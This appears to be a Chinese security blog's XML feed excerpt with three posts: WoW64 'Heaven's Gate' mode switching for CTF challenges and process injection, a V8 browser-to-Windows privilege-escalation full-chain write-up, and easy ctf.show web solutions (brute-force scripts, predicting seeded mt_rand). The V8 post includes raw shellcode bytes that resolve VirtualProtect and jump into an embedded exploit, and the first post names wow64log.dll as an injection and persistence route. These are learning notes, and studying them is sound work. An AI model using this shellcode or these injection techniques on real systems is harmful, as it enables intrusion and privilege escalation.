    <link href="/2022/04/06/%E5%85%B3%E4%BA%8E32%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%88%87%E6%8D%A2/"/>
    <url>/2022/04/06/%E5%85%B3%E4%BA%8E32%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E5%88%87%E6%8D%A2/</url>
    
    <content type="html"><![CDATA[<p>在写fullchain遇到个问题，浏览器程序是32位的，不能往64位的winlogon.exe注入shellcode。以前写过这类的题但没深入研究过，趁这个机会写篇blog。</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>简答来说就是通过切换cs来切换状态，要知道内核代码都是64位的，32位程序调用api肯定要进内核，所以肯定会有状态切换，可以看我之前写的api从三环到0环调用里提到过。</p><p>关于32位程序调用64位代码的方法其实在ctf中就出现过几次</p><p><a href="https://apeng.re/2020/03/11/2020npointer-3/#more">https://apeng.re/2020/03/11/2020npointer-3/#more</a></p><p>可以看阿鹏师傅写的这writeup。</p><p>这边附赠几个学习链接。</p><p><a href="https://www.slideshare.net/YardenShafir/jumping-into-heavens-gate">https://www.slideshare.net/YardenShafir/jumping-into-heavens-gate</a></p><p><a href="https://www.youtube.com/watch?v=fEVdqOkbUtI">https://www.youtube.com/watch?v=fEVdqOkbUtI</a></p><p><a href="https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-1/">https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-1/</a></p><p>近期准备用这个出个题，恰点烂钱。</p><h1 id="随便写写"><a href="#随便写写" class="headerlink" title="随便写写"></a>随便写写</h1><p>通读了上面几篇文章大概可以了解。每个32位程序都会加载几个原生的64位dll</p><p><img src="image-20220406163608119.png" alt="image-20220406163608119"></p><p><em>wow64.dll</em>, <em>wow64cpu.dll</em>, wow64win.dll和一个64位的ntdll.dll</p><p>且在32位程序初始化时会尝试load一个wow64log.dll在system32目录下，如果找到，它会被加载到每个wow64进程中。目前wow64log.dll并没有被windows提供，其实这是一种比较好的注入方法。</p><p><img src="image-20220406163908140.png" alt="image-20220406163908140"></p><p>如图所示，目前还可用，其实可以作为一种不错的驻留方式。</p><p>缺点就是他会劫持所有的32位进程，不可控。而且有可能该dll存在于system32目录中(默认不存在)。</p><p>后面提到的和想学的无关紧要，就忽略了</p><p>讲讲出题，最简单的就是直接retf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push   cs           <br>call   $+5           <br>add    dword [esp], 5<br>retf                 <br></code></pre></td></tr></table></figure><p>通过这样来切换位数。</p><p>但还有其他的办法比如jmp far</p><p><a href="https://github.com/zzhouhe/x96_POC/blob/master/main.cpp">https://github.com/zzhouhe/x96_POC/blob/master/main.cpp</a></p><p>可以看这个样例，融合起来，相对逆向难度就大了些//比较恶心人</p><p>至于为什么cs不同位数也不同可以去查询intel手册，看cs寄存器他的标志位代表着当前位数。</p><h1 id="关于出题"><a href="#关于出题" class="headerlink" title="关于出题"></a>关于出题</h1><p>出题其实很简单</p><p>32位先切换成64位下面必须写机器码</p><p>比如说你有个check函数你先编译成64位的然后dump出来直接放进32位即可</p><p><img src="image-20220412131740694.png" alt="image-20220412131740694"></p><p>一般不会出现不兼容的情况，函数默认开头会sub rsp xxx开辟一段栈帧给局部变量使用，如果引用到全局变量记得生成后手动patch一下</p><p>有几个注意点就是在编译的时候经尽量关闭地址随机化。否则全局变量重定位不可控。64位代码中引用到全局变量会gg。</p><p>吧check后的返回值保存在寄存器里，返回32位后验证下即可。</p><p>当然出题还是比较简单的。如果想要在32位里面调用64位api实现注入就稍微烦一些。</p><p><a href="https://github.com/rwfpl/rewolf-wow64ext">https://github.com/rwfpl/rewolf-wow64ext</a></p><p>这个项目里面都帮你写好了。就和32位调用api一样，先转换64位然后把参数按照64位fastcall进行布局然后直接调用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>v8 fullchain</title>
    <link href="/2022/04/03/v8-fullchain/"/>
    <url>/2022/04/03/v8-fullchain/</url>
    
    <content type="html"><![CDATA[<p>记录下v8 rce和windows exp的结合</p><a id="more"></a><p>参考</p><p><a href="https://nobb.site/2022/02/23/0x74/">https://nobb.site/2022/02/23/0x74/</a></p><p>作者有部分没写全这里完善下</p><h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>先说下大致流程</p><p>v8 rce后shellcode要改，大致内容就是virtualprotect设置exp可执行，然后跳转（这我自己写的，可能不太完美）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">var shellcode = [<br><span class="hljs-number">0x31</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8B</span>, <br>  <span class="hljs-number">0x70</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x53</span>, <br>  <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x72</span>, <br>  <span class="hljs-number">0x20</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x81</span>, <br>  <span class="hljs-number">0x38</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x04</span>, <br>  <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x64</span>, <br>  <span class="hljs-number">0x64</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDE</span>, <br>  <span class="hljs-number">0x66</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDE</span>, <br>  <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <br>  <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x42</span>, <br>  <span class="hljs-number">0x88</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x68</span>, <br>  <span class="hljs-number">0x75</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x54</span>, <br>  <span class="hljs-number">0x53</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x8D</span>, <br>  <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <br>  <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xA0</span>, <br>  <span class="hljs-number">0xED</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xC3</span><br>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>shellcode如上</p><p>逻辑如图所示，简单来说就是现根据kernel32基地址拿getprocessaddr然后拿virtualprotect地址接着跳转执行</p><p><img src="image-20220402181828040.png" alt="image-20220402181828040"></p><p>有三个需要更改的地方，一个是exp地址，上图是0xeda000</p><p>还有一个是length，上图是0xfa，这个length自行在v8 exp里修改即可。</p><p>当然直接跳转到exp肯定不能跑，这边需要借助下github的一个项目</p><p><a href="https://github.com/hasherezade/pe_to_shellcode">https://github.com/hasherezade/pe_to_shellcode</a></p><p>根据反射式dll注入改的，pe头部会被当作shellcode来执行，当然直接跑也可以。</p><p>在编写v8exp时，吧转换成shellcode的提权exp写入uint8array然后leak出提权exp地址</p><p>然后修改上面的shellcode，注意length也要对应的修改。</p><p><img src="image-20220402182258595.png" alt="image-20220402182258595"></p><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>打某些程序时出现peshellcode初始化异常问题</p><p>调试下来发现是ucrtbase.dll这个库不在该sandboxed process的module list里</p><p>可以用gcc编译提权的exp来解决。注意要带重定位表，不然pe2shellcode不能使用。</p>]]></content>
    
    
    
    <tags>
      
      <tag>v8</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf-web刷题</title>
    <link href="/2022/04/02/ctf-web%E5%88%B7%E9%A2%98/"/>
    <url>/2022/04/02/ctf-web%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>平台ctf show</p><p>很多水题，写着玩玩。太水的就不写了。</p><a id="more"></a><p>还会持续更新的，没事就做几道娱乐下。</p><h1 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h1><p>信息搜集太水了就不写了</p><p>参考</p><p><a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p><p>写的很全</p><p>水但是很重要，前期的信息搜集很必要的。</p><p>实战中主要还是看运气。</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>给了字典，bp直接跑就完事了。</p><p>Cutom iterator然后设置下base64encode即可，记得把urlencode关了</p><p>多跑个几次，有可能会失败</p><p><img src="image-20220402210140904.png" alt="image-20220402210140904"></p><h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>这题更偏向信息搜集，用layer爆子域名即可</p><h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-03 11:43:51</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-03 11:56:11</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$token</span> = md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;token&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) &amp;&amp; substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) ===substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))&#123;<br>        <span class="hljs-keyword">if</span>((intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))+intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>))+substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))/substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">31</span>,<span class="hljs-number">1</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>自己写脚本跑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$a</span>&lt;strlen(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$a</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$b</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$b</span>&lt;strlen(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$b</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$c</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$c</span>&lt;strlen(<span class="hljs-variable">$string</span>);<span class="hljs-variable">$c</span>++)&#123;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable">$string</span>[<span class="hljs-variable">$a</span>].<span class="hljs-variable">$string</span>[<span class="hljs-variable">$b</span>].<span class="hljs-variable">$string</span>[<span class="hljs-variable">$c</span>];<br>            <span class="hljs-variable">$token</span> = md5(<span class="hljs-variable">$flag</span>);<br>            <span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) &amp;&amp; substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>) ===substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))&#123;<br>                <span class="hljs-keyword">if</span>((intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>))+intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">14</span>,<span class="hljs-number">1</span>))+substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">17</span>,<span class="hljs-number">1</span>))/substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)===intval(substr(<span class="hljs-variable">$token</span>, <span class="hljs-number">31</span>,<span class="hljs-number">1</span>)))&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">a6e<br>aDp<br><span class="hljs-keyword">b7l</span><br><span class="hljs-keyword">ejt</span><br><span class="hljs-keyword">hc2</span><br><span class="hljs-keyword">jGd</span><br><span class="hljs-keyword">ktD</span><br><span class="hljs-keyword">o07</span><br><span class="hljs-keyword">pjd</span><br><span class="hljs-keyword">ubv</span><br><span class="hljs-keyword">v8O</span><br><span class="hljs-keyword">vMJ</span><br><span class="hljs-keyword">wuB</span><br><span class="hljs-keyword">wyG</span><br><span class="hljs-keyword">xjF</span><br><span class="hljs-keyword">1zg</span><br><span class="hljs-keyword">4cQ</span><br><span class="hljs-keyword">422</span><br><span class="hljs-keyword">6xU</span><br><span class="hljs-keyword">6Vh</span><br><span class="hljs-keyword">7vE</span><br><span class="hljs-keyword">AKh</span><br><span class="hljs-keyword">D36</span><br><span class="hljs-keyword">DCj</span><br><span class="hljs-keyword">GT7</span><br><span class="hljs-keyword">H3D</span><br><span class="hljs-keyword">Jik</span><br><span class="hljs-keyword">JKh</span><br><span class="hljs-keyword">KtR</span><br><span class="hljs-keyword">K2e</span><br><span class="hljs-keyword">LfJ</span><br><span class="hljs-keyword">Lqj</span><br><span class="hljs-keyword">Nzc</span><br><span class="hljs-keyword">Oie</span><br><span class="hljs-keyword">OiU</span><br><span class="hljs-keyword">R7V</span><br><span class="hljs-keyword">ScB</span><br><span class="hljs-keyword">SSM</span><br><span class="hljs-keyword">SVi</span><br><span class="hljs-keyword">UYg</span><br><span class="hljs-keyword">WwF</span><br></code></pre></td></tr></table></figure><p>答案很多随便挑一个</p><h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;?php</span><br><span class="hljs-section"></span><br><span class="hljs-section">/*</span><br><span class="hljs-section"># -*- coding: utf-8 -*-</span><br><span class="hljs-section"># @Author: h1xa</span><br><span class="hljs-section"># @Date:   2020-09-03 13<span class="hljs-number">:26</span><span class="hljs-number">:39</span></span><br><span class="hljs-section"># @Last Modified by:   h1xa</span><br><span class="hljs-section"># @Last Modified time: 2020-09-03 13<span class="hljs-number">:53</span><span class="hljs-number">:31</span></span><br><span class="hljs-section"># @email: h1xa@ctfer.com</span><br><span class="hljs-section"># @link: https://ctfer.com</span><br><span class="hljs-section"></span><br><span class="hljs-section">*/</span><br><span class="hljs-section"></span><br><span class="hljs-section">error_reporting(0);</span><br><span class="hljs-section">include(<span class="hljs-string">&quot;flag.php&quot;</span>);</span><br><span class="hljs-section">if(isset($_GET[&#x27;r&#x27;]))&#123;</span><br><span class="hljs-section">    $r = $_GET[&#x27;r&#x27;];</span><br><span class="hljs-section">    mt_srand(372619038);</span><br><span class="hljs-section">    if(intval($r)===intval(mt_rand()))&#123;</span><br><span class="hljs-section">        echo $flag;</span><br><span class="hljs-section">    &#125;</span><br><span class="hljs-section">&#125;else&#123;</span><br><span class="hljs-section">    highlight_file(__FILE__);</span><br><span class="hljs-section">    echo system(&#x27;cat /proc/version&#x27;);</span><br><span class="hljs-section">&#125;</span><br><span class="hljs-section"></span><br><span class="hljs-section">?&gt;</span> <span class="hljs-attribute">Linux</span> version <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>-generic (buildd@lcy<span class="hljs-number">02</span>-amd<span class="hljs-number">64</span>-<span class="hljs-number">002</span>) (gcc version <span class="hljs-number">9</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span> (Ubuntu <span class="hljs-number">9</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">17</span>ubuntu<span class="hljs-number">1</span>~<span class="hljs-number">20</span>.<span class="hljs-number">04</span>)) #<span class="hljs-number">113</span>-Ubuntu SMP Thu Feb <span class="hljs-number">3</span> <span class="hljs-number">18</span>:<span class="hljs-number">43</span>:<span class="hljs-number">29</span> UTC <span class="hljs-number">2022</span> Linux version <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>-generic (buildd@lcy<span class="hljs-number">02</span>-amd<span class="hljs-number">64</span>-<span class="hljs-number">002</span>) (gcc version <span class="hljs-number">9</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span> (Ubuntu <span class="hljs-number">9</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">17</span>ubuntu<span class="hljs-number">1</span>~<span class="hljs-number">20</span>.<span class="hljs-number">04</span>)) #<span class="hljs-number">113</span>-Ubuntu SMP Thu Feb <span class="hljs-number">3</span> <span class="hljs-number">18</span>:<span class="hljs-number">43</span>:<span class="hljs-number">29</span> UTC <span class="hljs-number">2022</span><br></code></pre></td></tr></table></figure><p>伪随机数种子是定的，自然可预测</p><p>输入1155388967</p><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-03 13:56:57</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-03 15:47:33</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$r</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;r&#x27;</span>];<br>    mt_srand(hexdec(substr(md5(<span class="hljs-variable">$flag</span>), <span class="hljs-number">0</span>,<span class="hljs-number">8</span>)));<br>    <span class="hljs-variable">$rand</span> = intval(<span class="hljs-variable">$r</span>)-intval(mt_rand());<br>    <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$rand</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>]==(mt_rand()+mt_rand()))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$rand</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">echo</span> system(<span class="hljs-string">&#x27;cat /proc/version&#x27;</span>);<br>&#125;<br>Linux version <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-100</span>-generic (buildd@lcy02-amd64<span class="hljs-number">-002</span>) (gcc version <span class="hljs-number">9.3</span><span class="hljs-number">.0</span> (Ubuntu <span class="hljs-number">9.3</span><span class="hljs-number">.0</span><span class="hljs-number">-17</span>ubuntu1~<span class="hljs-number">20.04</span>)) <span class="hljs-comment">#113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 Linux version 5.4.0-100-generic (buildd@lcy02-amd64-002) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 